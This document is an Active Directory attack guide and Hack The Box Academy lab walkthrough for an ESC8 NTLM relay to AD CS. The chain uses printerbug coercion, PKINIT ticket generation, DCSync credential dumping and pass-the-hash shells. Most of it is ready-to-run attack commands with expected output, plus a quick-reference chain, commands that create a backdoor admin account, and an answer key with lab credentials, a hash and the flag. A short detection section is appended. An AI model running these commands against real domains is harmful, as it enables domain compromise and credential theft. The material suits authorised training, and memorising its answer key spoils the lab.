# Pass the Certificate Attack

## 🎯 Overview

**Pass the Certificate** is an advanced Active Directory attack technique that leverages X.509 certificates to obtain Ticket Granting Tickets (TGTs) and ultimately achieve domain compromise. This attack primarily exploits:
- **Active Directory Certificate Services (AD CS) vulnerabilities**
- **PKINIT authentication mechanism**
- **Machine account privileges for DCSync**
- **ESC8 NTLM relay attacks against ADCS HTTP endpoints**

> **"Pass-the-Certificate attacks combine ADCS exploitation with Kerberos authentication to achieve domain admin privileges"**

## 🔐 PKINIT Authentication Architecture

### Public Key Cryptography for Initial Authentication
**PKINIT** is an extension of the Kerberos protocol that enables:
- **X.509 certificate-based authentication**
- **Smart card and certificate logons**
- **Elimination of password-based pre-authentication**
- **Machine account authentication via certificates**

### Certificate Authentication Flow
```
Certificate Request → ADCS HTTP Endpoint → Certificate Issuance → PKINIT TGT Request → Domain Controller → TGT with Machine Account Privileges
```

### Attack Prerequisites
- **ADCS web enrollment enabled** (HTTP endpoint accessible)
- **Valid domain credentials** for NTLM relay coercion
- **Network access** to both CA server and Domain Controller
- **KerberosAuthentication template** (or similar machine template)

## 🎖️ ESC8 - NTLM Relay to ADCS HTTP Endpoint

### ESC8 Attack Overview
**ESC8** (Escalation 8) is an NTLM relay attack that:
- **Targets ADCS HTTP web enrollment endpoint**
- **Relays machine account authentication**
- **Obtains machine certificates** for domain-joined computers
- **Bypasses PKI security through relay attack**

### Attack Architecture
```
Attacker Machine → NTLM Relay Server → Target Machine → ADCS HTTP Endpoint → Machine Certificate → PKINITtools → TGT → DCSync
```


## 🚀 ESC8 Attack Execution

### Phase 1: Environment Setup

#### Required Tools Installation
```bash
# Install dependencies (critical for PFX generation)
sudo apt update
sudo apt install python3-cryptography python3-openssl

# Clone attack tools
wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py
git clone https://github.com/dirkjanm/PKINITtools.git
```

#### Network Reconnaissance
```bash
# Identify Domain Controller and Certificate Authority
nmap -p 88,389,636 TARGET_SUBNET
nmap -p 80,443 CA_SERVER

# Verify ADCS HTTP endpoint
curl -k http://CA_SERVER/certsrv/
```

### Phase 2: NTLM Relay Attack Setup

#### Configure ntlmrelayx Listener
```bash
# Target ADCS HTTP endpoint with machine template
sudo impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# Expected startup output:
# [*] Protocol Client HTTP loaded..
# [*] Running in relay mode to single host
# [*] Setting up SMB Server on port 445
# [*] Servers started, waiting for connections
```

### Phase 3: Authentication Coercion

#### Printer Bug Exploitation
```bash
# Force DC machine account authentication
python3 printerbug.py DOMAIN/username:"password"@DC_IP ATTACKER_IP

# Alternative: PetitPotam (if available)
python3 PetitPotam.py ATTACKER_IP DC_IP -u username -p password
```

#### Expected Relay Results
```bash
# Successful NTLM relay output:
[*] SMBD-Thread-5: Received connection from DC_IP, attacking target http://CA_SERVER
[*] Authenticating against http://CA_SERVER as DOMAIN/DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 17
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

## 🔧 OpenSSL Troubleshooting (Critical)

### Common PKCS12 Generation Error
```bash
# Frequent error in newer Kali versions:
AttributeError: module 'OpenSSL.crypto' has no attribute 'PKCS12'

# Complete error context:
[*] GOT CERTIFICATE! ID 17
Exception in thread Thread-6:
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py", line 113, in generate_pfx
    p12 = crypto.PKCS12()
AttributeError: module 'OpenSSL.crypto' has no attribute 'PKCS12'
```

### Package Conflict Issues
```bash
# Common Kali package conflicts:
dpkg: error processing archive certipy-ad_5.0.2-0kali1_all.deb (--unpack):
trying to overwrite '/usr/lib/python3/dist-packages/certipy/__init__.py', which is also in package python3-certipy

# Externally-managed-environment errors:
error: externally-managed-environment
× This environment is externally managed
```

### Fix Method 1: Downgrade pyOpenSSL
```bash
# Install compatible OpenSSL version
sudo pip3 install pyOpenSSL==22.1.0 --break-system-packages --force-reinstall

# Verify fix
python3 -c "import OpenSSL.crypto; print('PKCS12' in dir(OpenSSL.crypto))"
# Should return: True
```

### Fix Method 2: Ubuntu Package Method (Tested Working)
```bash
# Download compatible packages (ARM64 example - adjust for x64)
wget http://ports.ubuntu.com/pool/main/p/python-cryptography/python3-cryptography_41.0.7-4ubuntu0.1_arm64.deb
wget http://launchpadlibrarian.net/715850281/python3-openssl_24.0.0-1_all.deb

# For x64 systems use:
# wget http://launchpadlibrarian.net/732112002/python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb

# Install packages (may show conflicts - ignore)
sudo dpkg -i python3-cryptography_41.0.7-4ubuntu0.1_arm64.deb
sudo dpkg -i python3-openssl_24.0.0-1_all.deb

# Test if fix worked
python3 -c "import OpenSSL.crypto; print('PKCS12' in dir(OpenSSL.crypto))"
# Should return: True
```

### Fix Method 2.5: Force Installation (If dpkg errors)
```bash
# If getting dpkg conflicts, force installation
sudo dpkg -i --force-overwrite python3-cryptography_41.0.7-4ubuntu0.1_arm64.deb
sudo dpkg -i --force-overwrite python3-openssl_24.0.0-1_all.deb
```

### Fix Method 3: Virtual Environment
```bash
# Create isolated environment
python3 -m venv esc8_env
source esc8_env/bin/activate

# Install specific versions
pip install impacket==0.12.0
pip install pyOpenSSL==22.1.0
pip install cryptography==38.0.4
```

### Common Troubleshooting Scenarios

#### Port Already in Use Error
```bash
# Error: OSError: [Errno 98] Address already in use
# Solution: Kill all existing ntlmrelayx processes
sudo pkill -f ntlmrelayx
sudo killall python3
sudo fuser -k 445/tcp

# Verify ports are free
sudo netstat -tulpn | grep :445
```

#### Printerbug RPC Errors
```bash
# Error: RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE
# This is NORMAL - the coercion still works even with this error
# The DC will still attempt authentication against your relay

# Alternative coercion if printerbug fails:
# Use PetitPotam or other coercion techniques
```

#### ntlmrelayx Hanging on "Getting certificate..."
```bash
# If attack hangs after "Getting certificate...", the OpenSSL issue is present
# Certificate was obtained but cannot be saved to PFX format
# Apply one of the OpenSSL fixes above and retry
```

## 🎫 PKINITtools Certificate Processing

### Environment Setup
```bash
# Clone and setup PKINITtools
cd ~ && git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt

# Fix oscrypto compatibility
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

### Kerberos Configuration
```bash
# Configure /etc/krb5.conf
sudo tee /etc/krb5.conf > /dev/null << EOF
[libdefaults]
    default_realm = DOMAIN.LOCAL

[realms]
    DOMAIN.LOCAL = {
        kdc = DC_IP
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
EOF

# Add DC to hosts file
echo "DC_IP dc01.domain.local" | sudo tee -a /etc/hosts
```

### TGT Generation from Certificate
```bash
# Generate TGT using machine certificate
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip DC_IP 'domain.local/dc01$' /tmp/dc.ccache

# Expected output:
# Loading certificate and key from file
# Requesting TGT
# AS-REP encryption key (you might need this later):
# [HEX_KEY]
# Saved TGT to file

# Export TGT for use
export KRB5CCNAME=/tmp/dc.ccache

# Verify ticket
klist
```

## 💎 DCSync Attack with Machine Account

### Machine Account Privileges
Machine accounts in Active Directory have:
- **Replication privileges** by default
- **DCSync capability** (DRSUAPI access)
- **High privileges** for domain operations
- **No interactive logon restrictions**

### Execute DCSync
```bash
# DCSync Administrator account
impacket-secretsdump -k -no-pass -dc-ip DC_IP -just-dc-user Administrator 'DOMAIN.LOCAL/DC01$'@DC01.DOMAIN.LOCAL

# Expected output:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTHASH:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:AES256_KEY
```

### Full Domain Dump (Optional)
```bash
# Extract all domain hashes
impacket-secretsdump -k -no-pass -dc-ip DC_IP -just-dc 'DOMAIN.LOCAL/DC01$'@DC01.DOMAIN.LOCAL
```

## 👑 Administrative Access via Pass-the-Hash

### Evil-WinRM Connection
```bash
# Deactivate venv (system evil-winrm needed)
deactivate

# Connect as Administrator
evil-winrm -i dc01.domain.local -u Administrator -H ADMINISTRATOR_NTHASH

# Expected connection:
Evil-WinRM shell v3.x
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Post-Exploitation
```powershell
# Verify privileges
whoami /all
net user /domain

# Access sensitive data
type C:\Users\Administrator\Desktop\flag.txt
dir C:\Windows\NTDS\

# Persistence options
net user backdoor Password123! /add
net localgroup administrators backdoor /add
```

## 🎯 HTB Academy Lab Walkthrough

### Lab Environment
- **Domain**: INLANEFREIGHT.LOCAL
- **Domain Controller**: dc01.inlanefreight.local (10.129.234.174)
- **Certificate Authority**: 10.129.234.172
- **Credentials**: wwhite:package5shores_topher1
- **Target**: Administrator's flag

### Step-by-Step Execution

#### 1. ESC8 NTLM Relay Setup
```bash
# Terminal 1: Start ntlmrelayx
sudo impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

#### 2. Authentication Coercion
```bash
# Terminal 2: Force DC authentication
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 ATTACKER_IP

# Expected result: DC01$.pfx generated
```

#### 3. PKINITtools Setup
```bash
# Setup environment
cd ~/PKINITtools
source .venv/bin/activate

# Generate TGT
python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache

# Export ticket
export KRB5CCNAME=/tmp/dc.ccache
```

#### 4. DCSync Administrator
```bash
# Extract Administrator hash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

# Result: Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
```

#### 5. Administrator Access
```bash
# Connect with hash
evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c

# Get flag
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt
# Result: a1fc497a8433f5a1b4c18274019a2cdb
```

### Validation and Verification

#### Confirm Certificate Generation
```bash
# After ntlmrelayx success, verify PFX file exists
ls -la DC01*.pfx
# Should show: DC01$.pfx with recent timestamp

# Check file size (should be ~2-3KB)
du -h DC01*.pfx
```

#### Validate TGT Generation
```bash
# After gettgtpkinit.py, confirm ticket cache
ls -la /tmp/dc.ccache

# Verify ticket contents
klist
# Should show: dc01$@INLANEFREIGHT.LOCAL with valid dates
```

#### Confirm DCSync Success
```bash
# After secretsdump, look for specific output pattern:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:[32-char-hash]:::
# Hash should be exactly 32 characters of hex

# Save hash for later use
echo "fd02e525dd676fd8ca04e200d265f20c" > admin_hash.txt
```

## 🛡️ Defense and Detection

### Attack Detection
```bash
# Event IDs to monitor:
# 4768 - Kerberos TGT Request (unusual machine accounts)
# 4769 - Kerberos Service Ticket Request
# 4624 - Successful Logon (Type 3 - Network)
# 4648 - Logon using explicit credentials

# ADCS specific events:
# Certificate Request Events (4886, 4887)
# Certificate Template Access
```

### Prevention Strategies
```bash
# ADCS hardening:
1. Disable HTTP enrollment (use HTTPS only)
2. Implement certificate template restrictions
3. Enable certificate request approval
4. Monitor certificate issuance logs

# Network segmentation:
1. Isolate ADCS servers
2. Implement network access controls
3. Monitor NTLM authentication patterns
4. Block unnecessary RPC protocols
```

### Monitoring Queries
```bash
# PowerShell: Detect unusual certificate requests
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4886,4887} | 
Where-Object {$_.Properties[1].Value -like "*DC01*"}

# Splunk: Monitor NTLM relay patterns
index=windows EventCode=4624 Logon_Type=3 | 
stats count by Source_Network_Address, Account_Name | 
where count > 10
```

## 💡 Key Takeaways

1. **ADCS is high-value target** - Machine certificates = domain admin
2. **OpenSSL compatibility critical** - Modern Kali has PKCS12 issues
3. **Machine accounts have DCSync** - No privilege escalation needed
4. **NTLM relay still effective** - Even in modern environments
5. **Certificate authentication bypasses** - Many traditional controls
6. **PKINITtools essential** - Converts certificates to Kerberos tickets
7. **Virtual environments solve** - Many compatibility issues
8. **HTTPS vs HTTP matters** - HTTP ADCS endpoints vulnerable

## 🔍 Alternative Attack Vectors

### Shadow Credentials
```bash
# Alternative to ESC8 using pywhisker
python3 pywhisker.py -d DOMAIN.LOCAL -u username -p password --target DC01$ --action add

# Generate TGT with shadow credential
python3 gettgtpkinit.py -cert-pfx USER.pfx -pfx-pass PASSWORD -dc-ip DC_IP DOMAIN.LOCAL/USER /tmp/user.ccache
```

### Other ESC Techniques
```bash
# ESC1 - Template misconfiguration
certipy template -u username@domain.local -p password -dc-ip DC_IP

# ESC4 - Template access control
certipy template -u username@domain.local -p password -dc-ip DC_IP -template TEMPLATE_NAME

# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
certipy req -u username@domain.local -p password -ca CA_NAME -template TEMPLATE -alt administrator@domain.local
```

## 🚀 Quick Reference - ESC8 Attack Chain

### Complete Attack Commands
```bash
# 1. Start ntlmrelayx (Terminal 1)
sudo impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# 2. Force authentication (Terminal 2)
python3 printerbug.py DOMAIN/user:"password"@DC_IP ATTACKER_IP

# 3. Setup PKINITtools
cd ~/PKINITtools && source .venv/bin/activate

# 4. Generate TGT from certificate
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip DC_IP 'domain.local/dc01$' /tmp/dc.ccache

# 5. Export ticket and DCSync
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip DC_IP -just-dc-user Administrator 'DOMAIN.LOCAL/DC01$'@DC01.DOMAIN.LOCAL

# 6. Evil-WinRM with Administrator hash
deactivate
evil-winrm -i dc01.domain.local -u Administrator -H ADMIN_HASH
```

### Emergency OpenSSL Fix
```bash
# Quick fix for PKCS12 errors
sudo pip3 install pyOpenSSL==22.1.0 --break-system-packages --force-reinstall
python3 -c "import OpenSSL.crypto; print('PKCS12' in dir(OpenSSL.crypto))"
```

## 🎯 HTB Academy Answer Key
- **Attack Type**: ESC8 NTLM Relay to ADCS
- **Certificate Generated**: DC01$.pfx (machine certificate)
- **Administrator Hash**: fd02e525dd676fd8ca04e200d265f20c
- **Final Flag**: a1fc497a8433f5a1b4c18274019a2cdb
- **Critical Fix**: pyOpenSSL downgrade to version 22.1.0